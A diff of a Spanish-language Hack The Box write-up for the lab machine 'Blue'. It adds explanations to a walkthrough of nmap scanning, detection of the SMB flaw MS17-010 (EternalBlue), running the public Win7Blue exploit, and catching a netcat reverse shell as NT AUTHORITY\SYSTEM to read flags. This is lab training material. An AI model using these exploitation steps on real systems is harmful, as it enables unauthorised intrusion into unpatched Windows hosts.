@@ -1,4 +1,5 @@
 ---
+icon: desktop
 layout:
   title:
     visible: true
@@ -14,7 +15,15 @@ layout:
 
 # Blue
 
+**Blue**, aunque posiblemente sea la máquina más simple en Hack The Box, demuestra la gravedad del exploit EternalBlue, que se ha utilizado en múltiples ataques de ransomware y criptominería a gran escala desde que se filtró públicamente.
 
+<figure><img src="../../../.gitbook/assets/Blue.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Blue**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.10.40 -oG allPorts
@@ -37,7 +46,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 25.76 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -50,9 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.76 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos.
 
 ```bash
 ❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -A -oN targeted -oX targetedXML
@@ -106,9 +113,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 77.20 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -117,11 +122,15 @@ Nmap done: 1 IP address (1 host up) scanned in 77.20 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../../.gitbook/assets/4029_vmware_1U4nfnh5Ul.png" alt=""><figcaption></figcaption></figure>
 
+## SMB Enumeration
 
+Realizaremos un escaneo más profundo a través de la herramienta de **Nmap** y sus scripts sobre el puerto SMB (445).
+
+En el resultado obtenido, verificamos que la máquina es vulnerable a **MS17-010 (EternalBlue)**.
 
 ```bash
 ❯ nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.40
@@ -178,14 +187,24 @@ Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
            Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
 ```
 
+## Intrusion and Privilege Escalation
 
+{% hint style="info" %}
+**EternalBlue** es una vulnerabilidad crítica en el protocolo SMB (Server Message Block) que permite a un atacante ejecutar código remoto en sistemas Windows sin necesidad de autenticarse. Fue explotada por un exploit desarrollado por la NSA, que más tarde fue filtrado por el grupo Shadow Brokers en 2017.
+{% endhint %}
+
+### EternalBlue Exploitation (MS17-010) \[Win7Blue]
+
+Verificaremos la arquitectura y el sistema operativo del equipo víctima. A través de **nxc** comprobamos que se trata de un `Windows 7 Professional x64`.
 
 ```bash
 ❯ nxc smb 10.10.10.40
 SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
 ```
 
+Nos descargaremos el siguiente repositorio, para realizar el ataque y ejecutaremos el script `Win7Blue`.
 
+{% embed url="https://github.com/d4t4s3c/Win7Blue" %}
 
 ```bash
 ❯ git clone https://github.com/d4t4s3c/Win7Blue; cd Win7Blue
@@ -202,7 +221,7 @@ Resolviendo deltas: 100% (279/279), listo.
 ❯ ./Win7Blue
 ```
 
-
+Estableceremos en el apartado de `RHOST` la dirección IP del equipo víctima, por otro lado, configuraremos nuestra dirección IP y puerto donde estaremos en escucha.
 
 ```bash
 
@@ -243,14 +262,14 @@ Resolviendo deltas: 100% (279/279), listo.
 press ENTER to continue...
 ```
 
+Desde una nueva terminal, nos pondremos en escucha tal y como nos indica el script.
 
-
-```
+```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el exploit dándole al **Enter**.
 
 ```bash
 ┌═══════════════════════════════════┐
@@ -300,7 +319,7 @@ good response status: INVALID_PARAMETER
 done
 ```
 
-
+Verificaremos que hemos ganado acceso como usuario `NT AUTHORITY\SYSTEM` y podemos visualizar las flags de **user.txt** y **root.txt**.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
@@ -317,9 +336,9 @@ nt authority\system
 
 C:\Users\haris\Desktop>type user.txt
 type user.txt
-1b17027eccc07e0956b921bab19de9df
+1b17027ecc**********************
 
 C:\Users\haris\Desktop>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-c65daeb7865ac117f87295bacf466a6c
+c65daeb786**********************
 ```
